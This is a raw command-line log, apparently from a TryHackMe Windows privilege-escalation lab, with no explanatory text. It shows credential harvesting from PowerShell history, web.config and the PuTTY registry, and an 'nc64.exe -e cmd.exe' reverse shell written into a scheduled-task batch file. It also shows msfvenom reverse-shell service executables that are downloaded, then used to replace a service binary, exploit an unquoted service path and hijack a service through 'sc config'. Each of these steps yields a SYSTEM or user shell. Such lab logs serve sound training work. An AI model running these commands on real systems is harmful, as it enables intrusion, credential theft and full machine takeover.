Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?

C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz


C:\Users\thm-unpriv>runas /savecred /user:admin cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\admin" ...
Enter the password for admin:
Attempting to start cmd.exe as user "WPRIVESC1\admin" ...
RUNAS ERROR: Unable to run - cmd.exe
1326: The user name or password is incorrect.

C:\Users\thm-unpriv>runas /savecred /user:admin cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\admin" ...
Enter the password for admin:
Attempting to start cmd.exe as user "WPRIVESC1\admin" ...
RUNAS ERROR: Unable to run - cmd.exe
1326: The user name or password is incorrect.

C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>

C:\Users\thm-unpriv>

C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362
 
 Directory of C:\Users\mike.katz\Desktop

05/04/2022  05:17 AM    <DIR>          .
05/04/2022  05:17 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/04/2022  05:17 AM                24 flag.txt
               3 File(s)          1,105 bytes
               2 Dir(s)  14,832,300,032 bytes free

C:\Users\mike.katz\Desktop>type flag.txt
THM{WHAT_IS_MY_PASSWORD}
C:\Users\mike.katz\Desktop>
--------------------------------------------------------------------------------
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.


C:\Users\thm-unpriv>
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        8/27/2022 4:14:41 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

C:\Users\thm-unpriv> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>

C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        8/27/2022 4:14:41 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

C:\Users\thm-unpriv> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files


C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.103.50 4444 > C:\tasks\schtask.bat

C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".

C:\Users\thm-unpriv>


C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        8/27/2022 4:14:41 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

C:\Users\thm-unpriv> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1

C:\Users\thm-unpriv>

--------------------------------------------------------------------------------
C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.103.50 4444 > C:\tasks\schtask.bat

C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
--------------------------------------------------------------------------------
C:\Users\thm-unpriv>

C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1

C:\Users\thm-unpriv>

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>
--------------------------------------------------------------------------------
root@ip-10-10-103-50:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.103.50 LPORT=4445 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
root@ip-10-10-103-50:~# ls
Desktop    Instructions  Postman      Rooms    thinclient_drives  type
Downloads  Pictures      rev-svc.exe  Scripts  Tools
root@ip-10-10-103-50:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.152.48 - - [27/Aug/2022 05:54:20] "GET /rev-svc.exe HTTP/1.1" 200 -

--------------------------------------------------------------------------------
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm-unpriv> wget http://10.10.103.50:8000/rev-svc.exe -O rev-svc.exe
PS C:\Users\thm-unpriv> dir


    Directory: C:\Users\thm-unpriv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         5/3/2022   3:14 PM                3D Objects
d-r---         5/3/2022   3:14 PM                Contacts
d-r---         5/4/2022   8:15 AM                Desktop
d-r---         5/3/2022   3:14 PM                Documents
d-r---         5/3/2022   3:14 PM                Downloads
d-r---         5/3/2022   3:14 PM                Favorites
d-r---         5/3/2022   3:14 PM                Links
d-r---         5/3/2022   3:14 PM                Music
d-r---         5/3/2022   3:14 PM                Pictures
d-r---         5/3/2022   3:14 PM                Saved Games
d-r---         5/3/2022   3:14 PM                Searches
d-r---         5/3/2022   3:14 PM                Videos
-a----        8/27/2022   4:54 AM          48640 rev-svc.exe

Windows PowerShell                                                                                                      Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                       PS C:\Users\thm-unpriv> wget http://10.10.103.50:8000/rev-svc.exe -O rev-svc.exe                                        PS C:\Users\thm-unpriv> dir                                                                                                                                                                                                                                                                                                                                                 Directory: C:\Users\thm-unpriv                                                                                                                                                                                                                                                                                                                                      Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---         5/3/2022   3:14 PM                3D Objects                                                             d-r---         5/3/2022   3:14 PM                Contacts                                                               d-r---         5/4/2022   8:15 AM                Desktop                                                                d-r---         5/3/2022   3:14 PM                Documents                                                              d-r---         5/3/2022   3:14 PM                Downloads                                                              d-r---         5/3/2022   3:14 PM                Favorites                                                              d-r---         5/3/2022   3:14 PM                Links                                                                  d-r---         5/3/2022   3:14 PM                Music                                                                  d-r---         5/3/2022   3:14 PM                Pictures                                                               d-r---         5/3/2022   3:14 PM                Saved Games                                                            d-r---         5/3/2022   3:14 PM                Searches                                                               d-r---         5/3/2022   3:14 PM                Videos                                                                 -a----        8/27/2022   4:54 AM          48640 rev-svc.exe                                                                      --------------------------------------------------------------------------------      


C:\Users\thm-unpriv>wget http://10.10.103.50:8000/rev-svc.exe -O rev-svc.exe
'wget' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

05/03/2022  11:56 AM    <DIR>          .
05/03/2022  11:56 AM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
08/27/2022  04:55 AM    <DIR>          Events
05/03/2022  11:56 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
08/27/2022  04:14 AM               696 LogFile.txt
08/27/2022  04:16 AM             1,343 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
05/03/2022  12:04 PM               108 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
05/03/2022  11:56 AM             6,867 unins000.dat
05/03/2022  11:56 AM           722,597 unins000.exe
05/03/2022  11:56 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              38 File(s)     11,144,869 bytes
               3 Dir(s)  15,048,724,480 bytes free

C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files

C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x3e8

C:\PROGRA~2\SYSTEM~1>sc start windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4588
        FLAGS              :

C:\PROGRA~2\SYSTEM~1>

--------------------------------------------------------------------------------

root@ip-10-10-103-50:~# nc -nlvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.10.152.48 49877 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

--------------------------------------------------------------------------------
C:\Users\svcusr1\Desktop>type flag.txt
type flag.txt
THM{AT_YOUR_SERVICE}
C:\Users\svcusr1\Desktop>

--------------------------------------------------------------------------------
C:\>sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

C:\>
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

C:\>
        ----
--------------------------------------------------------------------------------
root@ip-10-10-103-50:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.103.50 LPORT=4446 -f exe-service -o rev-svc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc2.exe
root@ip-10-10-103-50:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.152.48 - - [27/Aug/2022 06:42:51] "GET /rev-svc2.exe HTTP/1.1" 200 -
PS C:\Users\thm-unpriv> wget http://10.10.103.50:8000/rev-svc2.exe -O rev-svc2.exe
PS C:\Users\thm-unpriv> dir


    Directory: C:\Users\thm-unpriv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         5/3/2022   3:14 PM                3D Objects
d-r---         5/3/2022   3:14 PM                Contacts
d-r---         5/4/2022   8:15 AM                Desktop
d-r---         5/3/2022   3:14 PM                Documents
d-r---         5/3/2022   3:14 PM                Downloads
d-r---         5/3/2022   3:14 PM                Favorites
d-r---         5/3/2022   3:14 PM                Links
d-r---         5/3/2022   3:14 PM                Music
d-r---         5/3/2022   3:14 PM                Pictures
d-r---         5/3/2022   3:14 PM                Saved Games
d-r---         5/3/2022   3:14 PM                Searches
d-r---         5/3/2022   3:14 PM                Videos
-a----        8/27/2022   5:38 AM             24 qc
-a----        8/27/2022   5:42 AM          48640 rev-svc2.exe


PS C:\Users\thm-unpriv>

C:\Users\thm-unpriv>move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
        1 file(s) moved.
C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
processed file: C:\MyPrograms\Disk.exe
Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
processed file: C:\MyPrograms\Disk.exe
Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>

C:\Users\thm-unpriv>sc stop "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\thm-unpriv>sc start "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4504
        FLAGS              :

C:\Users\thm-unpriv>

root@ip-10-10-103-50:~# nc -nvlp 4446
Listening on [0.0.0.0] (family 0, port 4446)
Connection from 10.10.152.48 49905 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\svcusr2\Desktop>type flag.txt
type flag.txt
THM{QUOTES_EVERYWHERE}
C:\Users\svcusr2\Desktop>

--------------------------------------------------------------------------------

C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ? 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

C:\Users\thm-unpriv>

root@ip-10-10-103-50:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.103.50 LPORT=4447 -f exe-service -o rev-svc3.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc3.exe
root@ip-10-10-103-50:~# ls
Desktop       Pictures      rev-svc3.exe  Scripts            type
Downloads     Postman       rev-svc.exe   thinclient_drives
Instructions  rev-svc2.exe  Rooms         Tools
root@ip-10-10-103-50:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.152.48 - - [27/Aug/2022 06:51:57] "GET /rev-svc3.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.


PS C:\Users\thm-unpriv> wget http://10.10.103.50:8000/rev-svc3.exe -O rev-svc3.exe
PS C:\Users\thm-unpriv> dir


    Directory: C:\Users\thm-unpriv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         5/3/2022   3:14 PM                3D Objects
d-r---         5/3/2022   3:14 PM                Contacts
d-r---         5/4/2022   8:15 AM                Desktop
d-r---         5/3/2022   3:14 PM                Documents
d-r---         5/3/2022   3:14 PM                Downloads
d-r---         5/3/2022   3:14 PM                Favorites
d-r---         5/3/2022   3:14 PM                Links
d-r---         5/3/2022   3:14 PM                Music
d-r---         5/3/2022   3:14 PM                Pictures
d-r---         5/3/2022   3:14 PM                Saved Games
d-r---         5/3/2022   3:14 PM                Searches
d-r---         5/3/2022   3:14 PM                Videos
-a----        8/27/2022   5:49 AM              0 accesschk64.exe
-a----        8/27/2022   5:38 AM             24 qc
-a----        8/27/2022   5:51 AM          48640 rev-svc3.exe


PS C:\Users\thm-unpriv>


C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
processed file: C:\Users\thm-unpriv\rev-svc3.exe
Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS

C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2804
        FLAGS              :

C:\Users\thm-unpriv>

root@ip-10-10-103-50:~# nc -lvp 4447
Listening on [0.0.0.0] (family 0, port 4447)
Connection from ip-10-10-152-48.eu-west-1.compute.internal 49912 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
THM{INSECURE_SVC_CONFIG}
C:\Users\Administrator\Desktop>














